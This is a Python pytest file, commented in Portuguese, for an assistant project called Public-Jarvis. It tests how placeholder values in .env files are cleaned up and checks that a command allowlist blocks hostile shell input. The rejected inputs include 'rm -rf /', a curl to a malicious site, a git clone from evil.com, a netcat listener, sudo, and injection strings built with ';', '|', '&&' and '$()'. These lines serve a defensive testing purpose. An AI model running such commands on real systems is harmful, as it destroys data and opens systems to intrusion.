"""Testes unitários para configurações e execução segura do Public-Jarvis."""

from pathlib import Path
import pytest

from public_jarvis.config import JarvisSettings, load_settings
from public_jarvis.security import (
    ALLOWED_BINARIES,
    ALLOWED_SUBCOMMANDS,
    SafeShellError,
    is_user_authorized,
    run_safe,
    validate_command,
)


class TestConfig:
    """Testes para carregamento de configurações e higienização de placeholders."""

    def test_default_settings(self) -> None:
        settings = JarvisSettings()
        assert settings.gemini_api_key is None
        assert settings.openrouter_api_key is None
        assert settings.telegram_bot_token is None
        assert settings.allowed_users == []
        assert settings.db_path == Path("data/jarvis_memory.sqlite")
        assert settings.model == "gemini-2.5-flash"

    def test_load_settings_from_env_file(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        # Limpar variáveis residuais de ambiente para isolamento
        for key in [
            "GEMINI_API_KEY",
            "OPENROUTER_API_KEY",
            "TELEGRAM_BOT_TOKEN",
            "ALLOWED_USERS",
            "JARVIS_DB_PATH",
            "JARVIS_MODEL",
        ]:
            monkeypatch.delenv(key, raising=False)

        env_file = tmp_path / ".env"
        env_file.write_text(
            "\n".join([
                "GEMINI_API_KEY=AIzaSyTest123456",
                "OPENROUTER_API_KEY=sk-or-v1-abcdef",
                "TELEGRAM_BOT_TOKEN=123456789:ABC-DEF_ghijk",
                "ALLOWED_USERS=1001, 1002, 1003",
                "JARVIS_DB_PATH=custom/path/memory.sqlite",
                "JARVIS_MODEL=gemini-1.5-pro",
            ]),
            encoding="utf-8",
        )

        settings = load_settings(env_path=env_file)
        assert settings.gemini_api_key == "AIzaSyTest123456"
        assert settings.openrouter_api_key == "sk-or-v1-abcdef"
        assert settings.telegram_bot_token == "123456789:ABC-DEF_ghijk"
        assert settings.allowed_users == [1001, 1002, 1003]
        assert settings.db_path == Path("custom/path/memory.sqlite")
        assert settings.model == "gemini-1.5-pro"

    def test_load_settings_ignores_placeholders(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        for key in [
            "GEMINI_API_KEY",
            "OPENROUTER_API_KEY",
            "TELEGRAM_BOT_TOKEN",
            "ALLOWED_USERS",
            "JARVIS_DB_PATH",
            "JARVIS_MODEL",
        ]:
            monkeypatch.delenv(key, raising=False)

        env_file = tmp_path / ".env.placeholders"
        env_file.write_text(
            "\n".join([
                "GEMINI_API_KEY=your_gemini_api_key_here",
                "OPENROUTER_API_KEY=your_openrouter_api_key_here",
                "TELEGRAM_BOT_TOKEN=your_telegram_bot_token_here",
                "ALLOWED_USERS=your_telegram_id_here",
                "JARVIS_DB_PATH=your_db_path_here",
                "JARVIS_MODEL=your_model_here",
            ]),
            encoding="utf-8",
        )

        settings = load_settings(env_path=env_file)
        assert settings.gemini_api_key is None
        assert settings.openrouter_api_key is None
        assert settings.telegram_bot_token is None
        assert settings.allowed_users == []
        # Campos com padrão retornam aos defaults
        assert settings.db_path == Path("data/jarvis_memory.sqlite")
        assert settings.model == "gemini-2.5-flash"

    def test_load_settings_ignores_empty_strings(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        for key in [
            "GEMINI_API_KEY",
            "OPENROUTER_API_KEY",
            "TELEGRAM_BOT_TOKEN",
            "ALLOWED_USERS",
        ]:
            monkeypatch.delenv(key, raising=False)

        env_file = tmp_path / ".env.empty"
        env_file.write_text(
            "\n".join([
                "GEMINI_API_KEY=   ",
                "OPENROUTER_API_KEY=",
                "TELEGRAM_BOT_TOKEN=",
                "ALLOWED_USERS=",
            ]),
            encoding="utf-8",
        )

        settings = load_settings(env_path=env_file)
        assert settings.gemini_api_key is None
        assert settings.openrouter_api_key is None
        assert settings.telegram_bot_token is None
        assert settings.allowed_users == []

    def test_parse_allowed_users_csv_variations(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        cases = [
            ("12345", [12345]),
            ("10, 20, 30", [10, 20, 30]),
            ("  100 ,  200  ", [100, 200]),
            ("10, invalid_id, 20", [10, 20]),
            ("", []),
            ("your_user_id_here", []),
        ]
        for csv_val, expected in cases:
            env_file = tmp_path / f".env_{abs(hash(csv_val))}"
            env_file.write_text(f"ALLOWED_USERS={csv_val}\n", encoding="utf-8")
            settings = load_settings(env_path=env_file)
            assert settings.allowed_users == expected

    def test_load_settings_nonexistent_env_path(self, tmp_path: Path) -> None:
        missing_path = tmp_path / "does_not_exist.env"
        settings = load_settings(env_path=missing_path)
        assert isinstance(settings, JarvisSettings)


class TestSecurityValidateCommand:
    """Testes para validate_command contra injeção e comandos não autorizados."""

    def test_allowed_simple_commands(self) -> None:
        allowed = [
            ("ls -la", ["ls", "-la"]),
            ("pwd", ["pwd"]),
            ("df -h", ["df", "-h"]),
            ("free -m", ["free", "-m"]),
            ("ps aux", ["ps", "aux"]),
            ("uptime", ["uptime"]),
            ("cat README.md", ["cat", "README.md"]),
            ("echo 'teste'", ["echo", "teste"]),
            ("date", ["date"]),
            ("whoami", ["whoami"]),
            ("uname -a", ["uname", "-a"]),
            ("du -sh .", ["du", "-sh", "."]),
            ("head -n 10 file.txt", ["head", "-n", "10", "file.txt"]),
            ("tail -n 20 file.txt", ["tail", "-n", "20", "file.txt"]),
            ("wc -l file.txt", ["wc", "-l", "file.txt"]),
            ("grep 'termo' file.txt", ["grep", "termo", "file.txt"]),
            ("find . -name '*.py'", ["find", ".", "-name", "*.py"]),
        ]
        for cmd_str, expected_tokens in allowed:
            tokens = validate_command(cmd_str)
            assert tokens == expected_tokens

    def test_git_subcommands(self) -> None:
        # Permitidos: status, log, diff, show, branch
        valid_git = [
            ("git status", ["git", "status"]),
            ("git log -n 5 --oneline", ["git", "log", "-n", "5", "--oneline"]),
            ("git diff HEAD", ["git", "diff", "HEAD"]),
            ("git show HEAD", ["git", "show", "HEAD"]),
            ("git branch", ["git", "branch"]),
        ]
        for cmd_str, expected in valid_git:
            assert validate_command(cmd_str) == expected

        # Proibidos ou sem subcomando
        invalid_git = [
            "git",
            "git push",
            "git commit -m 'hacked'",
            "git checkout main",
            "git reset --hard",
            "git clone https://evil.com/repo",
            "git rm file.txt",
        ]
        for cmd_str in invalid_git:
            with pytest.raises(SafeShellError):
                validate_command(cmd_str)

    def test_python3_subcommands(self) -> None:
        # Permitidos: --version, -c, -m
        valid_py = [
            ("python3 --version", ["python3", "--version"]),
            ("python3 -c 'print(123)'", ["python3", "-c", "print(123)"]),
            ("python3 -m unittest", ["python3", "-m", "unittest"]),
        ]
        for cmd_str, expected in valid_py:
            assert validate_command(cmd_str) == expected

        # Proibidos ou sem subcomando
        invalid_py = [
            "python3",
            "python3 script.py",
            "python3 -i",
            "python3 -E script.py",
        ]
        for cmd_str in invalid_py:
            with pytest.raises(SafeShellError):
                validate_command(cmd_str)

    def test_forbidden_binaries(self) -> None:
        forbidden = [
            "rm -rf /",
            "curl https://malicious.site",
            "wget https://malicious.site",
            "bash -c 'id'",
            "sh -c 'id'",
            "sudo whoami",
            "chmod 777 secret.txt",
            "python script.py",  # python não está na whitelist (python3 está)
            "node index.js",
            "nc -lvp 4444",
        ]
        for cmd_str in forbidden:
            with pytest.raises(SafeShellError):
                validate_command(cmd_str)

    def test_injection_operators_blocked(self) -> None:
        injections = [
            "ls; rm -rf /",
            "pwd ; whoami",
            "ls | grep py",
            "uptime | cat",
            "date && whoami",
            "ls && rm file",
            "echo $(whoami)",
            "cat $(pwd)/secret",
            "echo `id`",
            "ls\nwhoami",
            "uptime\rdate",
        ]
        for cmd_str in injections:
            with pytest.raises(SafeShellError):
                validate_command(cmd_str)

    def test_path_traversal_blocked(self) -> None:
        paths = [
            "/bin/ls",
            "/usr/bin/python3 --version",
            "./ls",
            "../bin/pwd",
        ]
        for cmd_str in paths:
            with pytest.raises(SafeShellError):
                validate_command(cmd_str)

    def test_empty_commands_blocked(self) -> None:
        for empty in ["", "   ", "\t", "\n"]:
            with pytest.raises(SafeShellError):
                validate_command(empty)


class TestSecurityRunSafe:
    """Testes de execução real com subprocess seguro (sem shell=True)."""

    def test_run_safe_echo(self) -> None:
        code, stdout, stderr = run_safe("echo 'hello jarvis'")
        assert code == 0
        assert "hello jarvis" in stdout
        assert stderr == ""

    def test_run_safe_python_c(self) -> None:
        code, stdout, stderr = run_safe("python3 -c 'print(21 * 2)'")
        assert code == 0
        assert stdout.strip() == "42"
        assert stderr == ""

    def test_run_safe_blocks_unauthorized_binary(self) -> None:
        with pytest.raises(SafeShellError):
            run_safe("rm dummy_file.txt")

    def test_run_safe_blocks_injection(self) -> None:
        with pytest.raises(SafeShellError):
            run_safe("echo test ; whoami")

    def test_run_safe_timeout(self) -> None:
        with pytest.raises(SafeShellError) as exc_info:
            run_safe("python3 -c '__import__(\"time\").sleep(5)'", timeout=1)
        assert "tempo limite" in str(exc_info.value).lower()


class TestSecurityIsUserAuthorized:
    """Testes para a função is_user_authorized."""

    def test_authorized_user(self) -> None:
        assert is_user_authorized(12345, [12345, 67890]) is True

    def test_unauthorized_user(self) -> None:
        assert is_user_authorized(99999, [12345, 67890]) is False

    def test_empty_allowed_users_denies_all(self) -> None:
        assert is_user_authorized(12345, []) is False

    def test_type_resilience(self) -> None:
        # Se passado user_id como float ou representação numérica
        assert is_user_authorized(123, [123, 456]) is True
